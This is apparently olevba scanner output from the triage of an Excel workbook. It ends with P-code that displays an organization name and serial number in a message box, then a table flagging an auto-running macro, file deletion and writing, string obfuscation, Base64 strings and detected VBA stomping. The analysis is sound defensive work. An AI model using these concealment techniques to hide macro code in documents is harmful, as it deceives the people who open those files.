' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0005 "from "
' 	Add 
' 	Ld Application 
' 	MemLd OrganizationName 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x001F "with serial number : BMV2909-91"
' 	Add 
' 	Ld VerNum 
' 	ArgsLd Str$ 0x0001 
' 	ArgsLd Trim 0x0001 
' 	Add 
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #250:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

